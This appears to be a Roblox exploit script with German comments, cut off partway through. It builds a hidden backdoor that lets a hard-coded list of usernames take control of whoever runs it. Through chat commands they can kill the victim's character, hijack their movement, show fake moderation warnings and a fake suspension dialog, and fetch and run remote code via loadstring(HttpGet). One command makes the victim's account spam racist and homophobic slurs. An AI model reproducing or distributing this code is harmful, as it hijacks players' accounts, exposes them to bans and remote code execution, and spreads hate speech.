-- local PlayerModule = require(Player:WaitForChild("PlayerScripts"):WaitForChild("PlayerModule"))
-- local Controls = PlayerModule:GetControls()

-- **Ersetze setControlsEnabled durch eine einfachere Funktion, die Anchored verwendet**
local function setControlsEnabled(enabled)
    if Player.Character and Player.Character:FindFirstChild("HumanoidRootPart") then
        Player.Character.HumanoidRootPart.Anchored = not enabled -- Umgekehrt, da true = deaktiviert
    end
end

local function follow(onoff,pos)
getgenv().flwwing = onoff
while wait() do
if getgenv().flwwing then
setControlsEnabled(false) -- Verwende die neue Funktion
else
setControlsEnabled(true) -- Verwende die neue Funktion
break
end
wait()
game.Players.LocalPlayer.Character.Humanoid:MoveTo(pos)
end
end
local function nameMatches(player, partialName)
    local nameLower = player.Name:lower()
    local displayNameLower = player.DisplayName:lower()
    partialName = partialName:lower()

    -- Exact matches
    if nameLower == partialName or displayNameLower == partialName then
        return true
    end

    -- Partial matches
    if nameLower:find(partialName, 1, true) or displayNameLower:find(partialName, 1, true) then
        return true
    end

    return false
end

local adminCmd = {
    "AK_ADMEN1", "Dxan_PlayS", "I_LOVEYOU12210", "LeckMeineEi3r_ayri", "KRZXY_9", "Xeni_he07", "P6arx", "I_LOVEYOU11210", "AK_ADMEN2", "GYATT_DAMN1", "ddddd", "IIIlIIIllIlIllIII", "AliKhammas1234", "dgthgcnfhhbsd", "AliKhammas", "YournothimbuddyXD", "AK_ADMEN2", "BloxiAstra", "29Kyooo", "ImOn_ValveIndex", "328ml", "BasedLion25", "Akksosdmdokdkddmkd", "BOTGTMPStudio2", "damir123loin", "goekayhack", "Whitelisttestingg", "Robloxian74630436", "sheluvstutu", "browhatthebadass" , "SunSetzDown", "TheSadMan198", "FellFlower2", "", "", "ZZKWZA", "KKZWZA", "californagurl55"
}

local commandsList = {
    ".fast", ".normal", ".slow", ".hi", ".spam",
    ".void", ".js", ".js2", ".invert",
    ".uninvert",
    ".privland",
    ".spam", ".warn", ".suspend", ".knock", ".scare", ".kill", ".kick", ".fling", ".jump", ".rejoin", "suspend", "warn", "speed (target) (number)"
}

local frozenPlayers = {}
local controlInversionActive = {}
local spinActive = {}
local jumpDisabled = {}

local function Chat(msg)
    game.StarterGui:SetCore("ChatMakeSystemMessage", {
        Text = msg,
        Color = Color3.new(1, 0, 0),
        Font = Enum.Font.SourceSans,
        FontSize = Enum.FontSize.Size24,
    })
end

local function createCommandGui(player)
    local gui = Instance.new("ScreenGui", player.PlayerGui)
    gui.Name = "CommandGui"

    local frame = Instance.new("Frame", gui)
    frame.Size = UDim2.new(0.3, 0, 0.4, 0) -- Smaller GUI
    frame.Position = UDim2.new(0.35, 0, 0.3, 0)
    frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
    frame.BackgroundTransparency = 0.1
    frame.BorderSizePixel = 2
    frame.BorderColor3 = Color3.fromRGB(255, 255, 255)

    local titleLabel = Instance.new("TextLabel", frame)
    titleLabel.Size = UDim2.new(1, 0, 0.1, 0)
    titleLabel.Position = UDim2.new(0, 0, 0, 0)
    titleLabel.Text = "Owner Commands"
    -- Create the title label
local titleLabel = Instance.new("TextLabel") -- Assuming this already exists in your code

-- Set base properties
titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255) -- Base color can be white

-- Create a gradient for the text
local textGradient = Instance.new("UIGradient")
textGradient.Color = ColorSequence.new({
    ColorSequenceKeypoint.new(0, Color3.fromRGB(210, 150, 255)), -- Light Neon Purple
    ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 105, 180))  -- Vibrant Pink
})

-- Apply the gradient to the text label
textGradient.Parent = titleLabel
    titleLabel.BackgroundTransparency = 1
    titleLabel.Font = Enum.Font.SourceSansBold
    titleLabel.TextSize = 24

    local scrollFrame = Instance.new("ScrollingFrame", frame)
    scrollFrame.Size = UDim2.new(1, 0, 0.8, 0)
    scrollFrame.Position = UDim2.new(0, 0, 0.1, 0)
    scrollFrame.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
    scrollFrame.ScrollBarThickness = 8
    scrollFrame.CanvasSize = UDim2.new(0, 0, 5, 0) -- Adjust for commands

    local layout = Instance.new("UIListLayout", scrollFrame)
    layout.Padding = UDim.new(0, 5)

    for _, command in ipairs(commandsList) do
        local commandLabel = Instance.new("TextLabel", scrollFrame)
        commandLabel.Size = UDim2.new(1, 0, 0, 30)
        commandLabel.Text = command
        commandLabel.TextColor3 = Color3.new(1, 1, 1)
        commandLabel.BackgroundTransparency = 1
        commandLabel.Font = Enum.Font.SourceSans
        commandLabel.TextSize = 20
    end

    local closeButton = Instance.new("TextButton", frame)
    closeButton.Size = UDim2.new(0.3, 0, 0.1, 0)
    closeButton.Position = UDim2.new(0.35, 0, 0.9, 0)
    closeButton.Text = "Close"
    closeButton.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
    closeButton.TextColor3 = Color3.new(1, 1, 1)
    closeButton.Font = Enum.Font.SourceSans
    closeButton.TextSize = 18

    closeButton.MouseButton1Click:Connect(function()
        gui:Destroy()
    end)

    -- Make the frame draggable
    local dragging, dragInput, dragStart, startPos
    local UIS = game:GetService("UserInputService")

    local function update(input)
        local delta = input.Position - dragStart
        frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
    end

    frame.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            dragging = true
            dragStart = input.Position
            startPos = frame.Position
            input.Changed:Connect(function()
                if input.UserInputState == Enum.UserInputState.End then
                    dragging = false
                end
            end)
        end
    end)

    frame.InputChanged:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
            dragInput = input
        end
    end)

    UIS.InputChanged:Connect(function(input)
        if input == dragInput and dragging then
            update(input)
        end
    end)
end

-- Execute the command on the specific target
local function executeCommand(admin, target, command)
    if admin.Name == target.Name then
        Chat("You cannot target yourself!")
        return
    end

    if command == ".kill" then
        target.Character.Humanoid.Health = 0
    else
        Chat("Command not recognized or not implemented.")
    end
end

-- Admin command handling
local function setupAdminCommands(admin)
    admin.Chatted:Connect(function(msg)
        msg = msg:lower()
        local command, targetPartialName = msg:match("^(%S+)%s+(.*)$")
        if not command or not targetPartialName then
            command = msg -- If no target name is specified, just check the command
        end

        -- Get the target player if a name was specified
        local targetPlayer
        if targetPartialName then
            for _, p in ipairs(game.Players:GetPlayers()) do
                if nameMatches(p, targetPartialName) then
                    targetPlayer = p
                    break
                end
            end
        end

        local player = game.Players.LocalPlayer
        -- Only process commands without targets, or commands where this player is the target
        if not targetPartialName or (targetPlayer and targetPlayer == player) then
            -- Admin Commands
            if command == ".ownercmds" then
                createCommandGui(player)
            elseif command == ".rejoin" then
                game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, game.JobId, player)
            elseif command == ".fast" then
                player.Character.Humanoid.WalkSpeed = 50
            elseif command == ".normal" then
                player.Character.Humanoid.WalkSpeed = 16
            elseif command == ".slow" then
                player.Character.Humanoid.WalkSpeed = 5
            elseif command == ".privland" then
-- Teleport Script
local teleportPosition = Vector3.new(9998, 10051, 10002)

local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

local function teleport()
    if character and character:FindFirstChild("HumanoidRootPart") then
        character.HumanoidRootPart.CFrame = CFrame.new(teleportPosition)
    else
        warn("Character or HumanoidRootPart not found!")
    end
end

-- Call the teleport function
teleport()
            elseif command == ".unfloat" then
                player.Character.HumanoidRootPart.Anchored = false
            elseif command == ".float" then
                player.Character.HumanoidRootPart.CFrame = player.Character.HumanoidRootPart.CFrame + Vector3.new(0, 5, 0)
                wait(0.3)
                player.Character.HumanoidRootPart.Anchored = true
            elseif command == ".void" then
                player.Character.HumanoidRootPart.CFrame = CFrame.new(1000000, 1000000, 1000000)
elseif command == ".panel" then
loadstring(game:HttpGet('https://ichfickdeinemutta.pages.dev/Ownercmdspanel.lua'))()
            --[[ Removed Commands
            elseif command == ".jump" then
                player.Character.Humanoid.Jump = true
            elseif command == ".trip" then
               local humanoid = player.Character.Humanoid
local hrp = player.Character.HumanoidRootPart
-- Create banana MeshPart
local banana = Instance.new("MeshPart")
banana.MeshId = "rbxassetid://7076530645"
banana.TextureID = "rbxassetid://7076530688"
banana.Size = Vector3.new(0.7, 1, 0.8) -- Made banana bigger
banana.Anchored = true
banana.CanCollide = false
banana.Parent = workspace
-- Create slip sound
local slipSound = Instance.new("Sound")
slipSound.SoundId = "rbxassetid://8317474936"
slipSound.Volume = 1
slipSound.Parent = hrp
-- Use raycast to find floor position
local rayOrigin = hrp.Position + Vector3.new(0, 0, -2)
local rayDirection = Vector3.new(0, -10, 0)
local raycastResult = workspace:Raycast(rayOrigin, rayDirection)
if raycastResult then
    -- Place banana sideways with a 90-degree rotation on X axis
    banana.CFrame = CFrame.new(raycastResult.Position)
        * CFrame.Angles(math.rad(90), math.rad(math.random(0, 360)), 0)
else
    banana.CFrame = hrp.CFrame * CFrame.new(0, -2.5, -2)
end
   -- Create and configure the forward movement tween
    local tweenService = game:GetService("TweenService")
    local forwardTweenInfo = TweenInfo.new(
        0.3, -- Duration
        Enum.EasingStyle.Linear,
        Enum.EasingDirection.Out
    )

    -- Move character forward
    local forwardGoal = {CFrame = hrp.CFrame * CFrame.new(0, 0, -3)} -- Move 3 studs forward
    local forwardTween = tweenService:Create(hrp, forwardTweenInfo, forwardGoal)
    forwardTween:Play()

    -- Wait for forward movement to complete
    task.wait(0.3)

    -- Create and configure the arc falling tween
    local fallTweenInfo = TweenInfo.new(
        0.6, -- Longer duration for arc motion
        Enum.EasingStyle.Quad,
        Enum.EasingDirection.In -- Changed to In for better arc effect
    )

    -- Tween the character's position and rotation in an arc
    local fallGoal = {
        CFrame = hrp.CFrame
        * CFrame.new(0, -0.5, -4) -- Move forward and down
        * CFrame.Angles(math.rad(90), 0, 0) -- Rotate forward
    }
    local fallTween = tweenService:Create(hrp, fallTweenInfo, fallGoal)
    fallTween:Play()
humanoid:ChangeState(Enum.HumanoidStateType.FallingDown)
task.wait(2)
humanoid:ChangeState(Enum.HumanoidStateType.GettingUp)
task.wait(0.5)
humanoid:ChangeState(Enum.HumanoidStateType.None)
task.wait(1)
banana:Destroy()
slipSound:Destroy()
            elseif command == ".sit" then
                player.Character.Humanoid.Sit = true
            ]]


elseif command == ".smartwalktome" then
        -- **Keine Änderung an smartwalktome, da es PlayerModule nicht direkt verwendet**
        local Pathfind = game:GetService("PathfindingService")
local Humanoid = game.Players.LocalPlayer.Character:WaitForChild("Humanoid")
local Torso = game.Players.LocalPlayer.Character:WaitForChild("HumanoidRootPart")
local Path = Pathfind:CreatePath()
local GenPoint = nil
local PointArray = {}
local Folder = Instance.new("Folder")
Folder.Name = "Waypoints"
Folder.Parent = workspace
setControlsEnabled(false) -- Verwende die neue Funktion
Path:ComputeAsync(Torso.Position, admin.Character.HumanoidRootPart.Position)

local Waypoints = Path:GetWaypoints()

for i, v in ipairs(Waypoints) do

    GenPoint = v

    table.insert(PointArray, GenPoint)

    local Point = Instance.new("Part")
    Point.Anchored = true
    Point.Shape = "Ball"
    Point.Size = Vector3.one*0.5
    Point.Position = v.Position + Vector3.new(0,2,0)
    Point.CanCollide = false
    Point.Parent = workspace.Waypoints
    Point.Name = "Point"..tostring(i)
end

for i2, v2 in ipairs(PointArray) do

    if v2.Action == Enum.PathWaypointAction.Jump then
        Humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
    end

    Humanoid:MoveTo(v2.Position)
    Humanoid.MoveToFinished:Wait()
    workspace.Waypoints["Point"..tostring(i2)].BrickColor = BrickColor.new("Camo")
    workspace.Waypoints["Point"..tostring(i2)].Material = "Neon"
end
setControlsEnabled(true) -- Verwende die neue Funktion
game.Workspace.Waypoints:Destroy()
        elseif command == ".walktome" then

        -- **Keine Änderung an walktome, da es PlayerModule nicht direkt verwendet**
local targetPart = admin.Character:WaitForChild("HumanoidRootPart") -- Replace "sdfsf" with your part's name if needed
local character = Player.Character or Player.CharacterAdded:Wait()


-- Function to move character to a target part
local function moveToPart(part)
    if character and character:FindFirstChild("Humanoid") then
        local humanoid = character.Humanoid

        -- Disable controls
        setControlsEnabled(false) -- Verwende die neue Funktion

        -- Move to the target part
        humanoid:MoveTo(part.Position)

        -- Wait until the character reaches the destination or time out after 10 seconds
        local reached = humanoid.MoveToFinished:Wait()
        if reached then
        else
        end

        -- Re-enable controls
        setControlsEnabled(true) -- Verwende die neue Funktion
    end
end

-- Example usage: Move the character to the part when the script runs
moveToPart(targetPart)

            elseif command == ".control" then
            local function disableSeat(seat)
    if seat:IsA("Seat") or seat:IsA("VehicleSeat") then
        seat.Disabled = true
        seat.CanCollide = false
    end
end

for _, seat in game.Workspace:GetDescendants() do
    disableSeat(seat)
end

game.Workspace.DescendantAdded:Connect(disableSeat)
-- **Kommentiere PlayerModule-bezogenen Code in .control aus**
-- local Players = game:GetService("Players")
-- local Player = Players.LocalPlayer
-- local PlayerModule = require(Player:WaitForChild("PlayerScripts"):WaitForChild("PlayerModule"))

-- -- Get the control module
-- local Controls = PlayerModule:GetControls()

-- -- Disable controls
-- Controls:Disable()
setControlsEnabled(false) -- Verwende die neue Funktion

-- Ensure this script is a LocalScript
local RunService = game:GetService("RunService")
local Players = game:GetService("Players")

-- Global Control Variable
getgenv().controlling = true

-- References to Player and Target
local player = Players.LocalPlayer
local targetPlayer = admin -- Replace 'admin' with target name

-- Validate target player exists
if not targetPlayer then
    warn("Target player not found!")
    return
end

-- Character References
local character = player.Character or player.CharacterAdded:Wait()
local targetCharacter = targetPlayer.Character or targetPlayer.CharacterAdded:Wait()

-- Character Components
local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
local humanoid = character:WaitForChild("Humanoid")
local targetHumanoidRootPart = targetCharacter:WaitForChild("HumanoidRootPart")
local targetHumanoid = targetCharacter:WaitForChild("Humanoid")

-- Configuration Parameters
local sideOffset = 5            -- Distance to maintain to the side
local smoothingFactor = 0.2     -- Interpolation smoothness (0-1)
local maxSpeed = 50             -- Maximum movement speed
local jumpEnabled = false       -- Disabled jumping to stay grounded
local rayHeight = 2         -- Height of floor detection ray
local floorOffset = 3        -- Distance to maintain above ground

-- Initialize Movement Variables
local targetPosition = targetHumanoidRootPart.Position
local targetCFrame = targetHumanoidRootPart.CFrame
local currentPos = humanoidRootPart.Position
local velocity = Vector3.new(0, 0, 0)

-- Floor Detection Function
local function getFloorHeight(position)
    local rayStart = Vector3.new(position.X, position.Y + rayHeight, position.Z)
    local rayEnd = Vector3.new(position.X, position.Y - rayHeight, position.Z)

    local raycastParams = RaycastParams.new()
    raycastParams.FilterType = Enum.RaycastFilterType.Exclude
    raycastParams.FilterDescendantsInstances = {character, targetCharacter}

    local raycastResult = workspace:Raycast(rayStart, rayEnd - rayStart, raycastParams)

    if raycastResult then
        return raycastResult.Position.Y + floorOffset
    end
    return position.Y
end
-- Main Control Loop
RunService.RenderStepped:Connect(function(deltaTime)
    if not getgenv().controlling then return end

    -- Safety check for character existence
    if not character.Parent or not targetCharacter.Parent then
        return
    end

    -- Update Target Position
    targetPosition = targetHumanoidRootPart.Position
    targetCFrame = targetHumanoidRootPart.CFrame

    -- Calculate Side Position
    local rightDirection = (targetCFrame.RightVector).Unit
    local desiredPosition = targetPosition + (rightDirection * sideOffset)

    -- Get Floor Height at Desired Position
    local floorHeight = getFloorHeight(desiredPosition)
    desiredPosition = Vector3.new(desiredPosition.X, floorHeight, desiredPosition.Z)

    -- Smooth Movement Calculation
    currentPos = humanoidRootPart.Position
    local newPos = currentPos:Lerp(desiredPosition, smoothingFactor)

    -- Velocity Calculation with Speed Limit
    velocity = (newPos - currentPos) / deltaTime
    if velocity.Magnitude > maxSpeed then
        velocity = velocity.Unit * maxSpeed
    end

    -- Apply Movement
    humanoidRootPart.Velocity = velocity

    -- Synchronize Orientation
    local targetOrientation = targetCFrame - targetCFrame.Position
    humanoidRootPart.CFrame = CFrame.new(newPos) * targetOrientation

    -- Force Y Velocity to prevent floating
    humanoidRootPart.Velocity = Vector3.new(
        humanoidRootPart.Velocity.X,
        math.min(humanoidRootPart.Velocity.Y, 0), -- Only allow downward vertical movement
        humanoidRootPart.Velocity.Z
    )
end)

-- Disable Jump
humanoid.Jump = false
            elseif command == ".uncontrol" then
            getgenv().controlling=false
            -- **Kommentiere PlayerModule-bezogenen Code in .uncontrol aus**
            -- local Players = game:GetService("Players")
            -- local Player = Players.LocalPlayer
            -- local PlayerModule = require(Player:WaitForChild("PlayerScripts"):WaitForChild("PlayerModule"))

            -- -- Get the control module
            -- local Controls = PlayerModule:GetControls()

            -- -- Disable controls
            -- Controls:Enable()
            setControlsEnabled(true) -- Verwende die neue Funktion
            local function enableSeat(seat)
    if seat:IsA("Seat") or seat:IsA("VehicleSeat") then
        seat.Disabled = false
        seat.CanCollide = true
    end
end

for _, seat in game.Workspace:GetDescendants() do
    enableSeat(seat)
end

game.Workspace.DescendantAdded:Connect(enableSeat)
            --[[ Removed Commands
            elseif command == ".fling" then
                game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity=Vector3.new(250,250,250)
                game.Players.LocalPlayer.Character.Humanoid.Sit=true
            elseif command == ".freeze" then
                player.Character.HumanoidRootPart.Anchored = true
                frozenPlayers[player.UserId] = true
            elseif command == ".unfreeze" then
                for userId in pairs(frozenPlayers) do
                    local frozenPlayer = game.Players:GetPlayerByUserId(userId)
                    if frozenPlayer and frozenPlayer.Character then
                        frozenPlayer.Character.HumanoidRootPart.Anchored = false
                    end
                end
                frozenPlayers = {}
            elseif command == ".kick" then
                player:Kick("Kicked")
            elseif command == ".follow" then
            follow(true,admin.Character.HumanoidRootPart.Position)
            elseif command == ".unfollow" then
            follow(false,admin.Character.HumanoidRootPart.Position) -- Korrektur: unfollow sollte false übergeben
            ]]
            elseif command == ".spam" then
loadstring(game:HttpGet("https://raw.githubusercontent.com/vqmpjayZ/More-Scripts/refs/heads/main/Anthony's%20ACL"))()
wait(1)
local function Chat(msg)
    -- Check if we're using the old chat system
    local oldChat = game:GetService("ReplicatedStorage"):FindFirstChild("DefaultChatSystemChatEvents")
    
    -- Send message using the old chat system if it exists
    if oldChat then
        game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(msg, "All")
    else
        -- Send message using the new TextChatService
        local textChatService = game:GetService("TextChatService")
        local channel = textChatService.TextChannels.RBXGeneral
        channel:SendAsync(msg)
    end
end

-- Call the Chat function
            Chat("nigga fuck nigga fuck nigga bitch nigger faggot fuck you sex hot faggot i hate niggers alot")
            Chat("nigga fuck nigga fuck nigga bitch nigger faggot fuck you sex hot faggot i hate niggers alot")
            Chat("nigga fuck nigga fuck nigga bitch nigger faggot fuck you sex hot faggot i hate niggers alot")
            Chat("nigga fuck nigga fuck nigga bitch nigger faggot fuck you sex hot faggot i hate niggers alot")
            Chat("nigga fuck nigga fuck nigga bitch nigger faggot fuck you sex hot faggot i hate niggers alot")
            Chat("nigga fuck nigga fuck nigga bitch nigger faggot fuck you sex hot faggot i hate niggers alot")
            Chat("nigga fuck nigga fuck nigga bitch nigger faggot fuck you sex hot faggot i hate niggers alot")
            Chat("nigga fuck nigga fuck nigga bitch nigger faggot fuck you sex hot faggot i hate niggers alot")
            Chat("nigga fuck nigga fuck nigga bitch nigger faggot fuck you sex hot faggot i hate niggers alot")
            elseif command == ".warn" then
-- Gui to Lua
-- Version: 3.2

-- Instances:

local RobloxVoiceChatPromptGui = Instance.new("ScreenGui")
local Content = Instance.new("Frame")
local Toast1 = Instance.new("Frame")
local ToastContainer = Instance.new("TextButton")
local UISizeConstraint = Instance.new("UISizeConstraint")
local Toast = Instance.new("ImageLabel")
local ToastFrame = Instance.new("Frame")
local UIListLayout2 = Instance.new("UIListLayout")
local ToastMessageFrame = Instance.new("Frame")
local UIListLayout3 = Instance.new("UIListLayout")
local ToastTextFrame = Instance.new("Frame")
local UIListLayout = Instance.new("UIListLayout")
local ToastTitle = Instance.new("TextLabel")
local ToastSubtitle = Instance.new("TextLabel")
local ToastIcon = Instance.new("ImageLabel")
local UIPadding = Instance.new("UIPadding")
local Scaler = Instance.new("UIScale")

--Properties:

RobloxVoiceChatPromptGui.Name = "RobloxVoiceChatPromptGui"
RobloxVoiceChatPromptGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
RobloxVoiceChatPromptGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
RobloxVoiceChatPromptGui.DisplayOrder = 9

Content.Name = "Content"
Content.Parent = RobloxVoiceChatPromptGui
Content.BackgroundTransparency = 1.000
Content.Size = UDim2.new(1, 0, 1, 0)

Toast1.Name = "Toast1"
Toast1.Parent = Content
Toast1.BackgroundTransparency = 1.000
Toast1.Size = UDim2.new(1, 0, 1, 0)

ToastContainer.Name = "ToastContainer"
ToastContainer.Parent = Toast1
ToastContainer.AnchorPoint = Vector2.new(0.5, 0)
ToastContainer.BackgroundTransparency = 1.000
ToastContainer.Position = UDim2.new(0.5, 0, 0, -148)
ToastContainer.Size = UDim2.new(1, -24, 0, 93)
ToastContainer.Text = ""

UISizeConstraint.Parent = ToastContainer
UISizeConstraint.MaxSize = Vector2.new(400, math.huge)
UISizeConstraint.MinSize = Vector2.new(24, 60)

Toast.Name = "Toast"
Toast.Parent = ToastContainer
Toast.AnchorPoint = Vector2.new(0.5, 0.5)
Toast.BackgroundTransparency = 1.000
Toast.BorderSizePixel = 0
Toast.LayoutOrder = 1
Toast.Position = UDim2.new(0.5, 0, 0.5, 0)
Toast.Size = UDim2.new(1, 0, 1, 0)
Toast.Image = "rbxasset://LuaPackages/Packages/_Index/FoundationImages/FoundationImages/SpriteSheets/img_set_1x_2.png"
Toast.ImageColor3 = Color3.fromRGB(57, 59, 61)
Toast.ImageRectOffset = Vector2.new(490, 267)
Toast.ImageRectSize = Vector2.new(21, 21)
Toast.ScaleType = Enum.ScaleType.Slice
Toast.SliceCenter = Rect.new(10, 10, 11, 11)

ToastFrame.Name = "ToastFrame"
ToastFrame.Parent = Toast
ToastFrame.BackgroundTransparency = 1.000
ToastFrame.BorderSizePixel = 0
ToastFrame.ClipsDescendants = true
ToastFrame.Size = UDim2.new(1, 0, 1, 0)

UIListLayout2.Name = "UIListLayout2"
UIListLayout2.Parent = ToastFrame
UIListLayout2.FillDirection = Enum.FillDirection.Horizontal
UIListLayout2.SortOrder = Enum.SortOrder.LayoutOrder
UIListLayout2.VerticalAlignment = Enum.VerticalAlignment.Center
UIListLayout2.Padding = UDim.new(0, 12)

ToastMessageFrame.Name = "ToastMessageFrame"
ToastMessageFrame.Parent = ToastFrame
ToastMessageFrame.BackgroundTransparency = 1.000
ToastMessageFrame.BorderSizePixel = 0
ToastMessageFrame.LayoutOrder = 1
ToastMessageFrame.Size = UDim2.new(1, 0, 1, 0)

UIListLayout3.Name = "UIListLayout3"
UIListLayout3.Parent = ToastMessageFrame
UIListLayout3.FillDirection = Enum.FillDirection.Horizontal
UIListLayout3.SortOrder = Enum.SortOrder.LayoutOrder
UIListLayout3.VerticalAlignment = Enum.VerticalAlignment.Center
UIListLayout3.Padding = UDim.new(0, 12)

ToastTextFrame.Name = "ToastTextFrame"
ToastTextFrame.Parent = ToastMessageFrame
ToastTextFrame.BackgroundTransparency = 1.000
ToastTextFrame.LayoutOrder = 2
ToastTextFrame.Size = UDim2.new(1, -48, 0, 69)

UIListLayout.Parent = ToastTextFrame
UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder

ToastTitle.Name = "ToastTitle"
ToastTitle.Parent = ToastTextFrame
ToastTitle.BackgroundTransparency = 1.000
ToastTitle.LayoutOrder = 1
ToastTitle.Size = UDim2.new(1, 0, 0, 22)
ToastTitle.Font = Enum.Font.BuilderSansBold
ToastTitle.Text = "Remember our policies"
ToastTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
ToastTitle.TextSize = 20.000
ToastTitle.TextWrapped = true
ToastTitle.TextXAlignment = Enum.TextXAlignment.Left

ToastSubtitle.Name = "ToastSubtitle"
ToastSubtitle.Parent = ToastTextFrame
ToastSubtitle.BackgroundTransparency = 1.000
ToastSubtitle.LayoutOrder = 2
ToastSubtitle.Size = UDim2.new(1, 0, 0, 47)
ToastSubtitle.Font = Enum.Font.BuilderSans
ToastSubtitle.Text = "We've detected language that may violate Roblox's Community Standards. You may lose access to Chat with Voice after multiple violations."
ToastSubtitle.TextColor3 = Color3.fromRGB(255, 255, 255)
ToastSubtitle.TextSize = 15.000
ToastSubtitle.TextWrapped = true
ToastSubtitle.TextXAlignment = Enum.TextXAlignment.Left

ToastIcon.Name = "ToastIcon"
ToastIcon.Parent = ToastMessageFrame
ToastIcon.BackgroundTransparency = 1.000
ToastIcon.LayoutOrder = 1
ToastIcon.Size = UDim2.new(0, 36, 0, 36)
ToastIcon.Image = "rbxasset://LuaPackages/Packages/_Index/FoundationImages/FoundationImages/SpriteSheets/img_set_1x_6.png"
ToastIcon.ImageRectOffset = Vector2.new(248, 386)
ToastIcon.ImageRectSize = Vector2.new(36, 36)

UIPadding.Parent = ToastFrame
UIPadding.PaddingBottom = UDim.new(0, 12)
UIPadding.PaddingLeft = UDim.new(0, 12)
UIPadding.PaddingRight = UDim.new(0, 12)
UIPadding.PaddingTop = UDim.new(0, 12)

Scaler.Name = "Scaler"
Scaler.Parent = Toast


-- Create TweenInfo for smooth animation
local tweenInfo = TweenInfo.new(
    0.2, -- Duration (0.5 seconds)
    Enum.EasingStyle.Quad,
    Enum.EasingDirection.Out
)

-- Get TweenService
local TweenService = game:GetService("TweenService")

-- Define positions
local outPos = UDim2.new(0.5, 0, 0, -35)
local inPos = UDim2.new(0.5, 0, 0, -148)

-- Create tween to out position
local tweenOut = TweenService:Create(ToastContainer, tweenInfo, {
    Position = outPos
})

-- Create tween to in position
local tweenIn = TweenService:Create(ToastContainer, tweenInfo, {
    Position = inPos
})

-- Play the sequence
tweenOut:Play()
wait(6.5) -- Wait for 6.5 seconds
tweenIn:Play()
tweenIn.Completed:Wait() -- Wait for tween to complete
RobloxVoiceChatPromptGui:Destroy() -- Destroy the GUI

            elseif command == ".suspend" then
-- Gui to Lua
-- Version: 3.2

-- Instances:

local InGameMenuInformationalDialog = Instance.new("ScreenGui")
local DialogMainFrame = Instance.new("ImageLabel")
local Divider = Instance.new("Frame")
local SpaceContainer2 = Instance.new("Frame")
local TitleTextContainer = Instance.new("Frame")
local TitleText = Instance.new("TextLabel")
local UITextSizeConstraint = Instance.new("UITextSizeConstraint")
local ButtonContainer = Instance.new("Frame")
local Layout = Instance.new("UIListLayout")
local TextSpaceContainer = Instance.new("Frame")
local SubBodyTextContainer = Instance.new("Frame")
local BodyText = Instance.new("TextLabel")
local UITextSizeConstraint_2 = Instance.new("UITextSizeConstraint")
local BodyTextContainer = Instance.new("Frame")
local BodyText_2 = Instance.new("TextLabel")
local UITextSizeConstraint_3 = Instance.new("UITextSizeConstraint")
local WarnText = Instance.new("TextLabel")
local UITextSizeConstraint_4 = Instance.new("UITextSizeConstraint")
local Padding = Instance.new("UIPadding")
local Icon = Instance.new("ImageLabel")
local DividerSpaceContainer = Instance.new("Frame")
local Overlay = Instance.new("TextButton")
local ConfirmButton = Instance.new("ImageButton")
local ButtonContent = Instance.new("Frame")
local ButtonMiddleContent = Instance.new("Frame")
local UIListLayout = Instance.new("UIListLayout")
local Text = Instance.new("TextLabel")
local SecondaryButton = Instance.new("ImageButton")
local sizeConstraint = Instance.new("UISizeConstraint")
local textLabel = Instance.new("TextLabel")
local SecondaryButton_2 = Instance.new("ImageButton")
local sizeConstraint_2 = Instance.new("UISizeConstraint")
local textLabel_2 = Instance.new("TextLabel")

--Properties:

InGameMenuInformationalDialog.Name = "InGameMenuInformationalDialog"
InGameMenuInformationalDialog.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
InGameMenuInformationalDialog.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
InGameMenuInformationalDialog.DisplayOrder = 8

DialogMainFrame.Name = "DialogMainFrame"
DialogMainFrame.Parent = InGameMenuInformationalDialog
DialogMainFrame.AnchorPoint = Vector2.new(0.5, 0.5)
DialogMainFrame.BackgroundTransparency = 1.000
DialogMainFrame.Position = UDim2.new(0.5, 0, 0.50000006, 0)
DialogMainFrame.Size = UDim2.new(0, 365, 0, 371)
DialogMainFrame.Image = "rbxasset://LuaPackages/Packages/_Index/FoundationImages/FoundationImages/SpriteSheets/img_set_1x_1.png"
DialogMainFrame.ImageColor3 = Color3.fromRGB(57, 59, 61)
DialogMainFrame.ImageRectOffset = Vector2.new(402, 494)
DialogMainFrame.ImageRectSize = Vector2.new(17, 17)
DialogMainFrame.ScaleType = Enum.ScaleType.Slice
DialogMainFrame.SliceCenter = Rect.new(8, 8, 9, 9)

Divider.Name = "Divider"
Divider.Parent = DialogMainFrame
Divider.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Divider.BackgroundTransparency = 0.800
Divider.BorderSizePixel = 0
Divider.LayoutOrder = 3
Divider.Position = UDim2.new(0.0984615386, 0, 0.268882185, 0)
Divider.Size = UDim2.new(0.800000012, 0, 0, 1)

SpaceContainer2.Name = "SpaceContainer2"
SpaceContainer2.Parent = DialogMainFrame
SpaceContainer2.BackgroundTransparency = 1.000
SpaceContainer2.LayoutOrder = 8
SpaceContainer2.Size = UDim2.new(1, 0, 0, 10)

TitleTextContainer.Name = "TitleTextContainer"
TitleTextContainer.Parent = DialogMainFrame
TitleTextContainer.BackgroundTransparency = 1.000
TitleTextContainer.LayoutOrder = 2
TitleTextContainer.Size = UDim2.new(1, 0, 0, 45)

TitleText.Name = "TitleText"
TitleText.Parent = TitleTextContainer
TitleText.BackgroundTransparency = 1.000
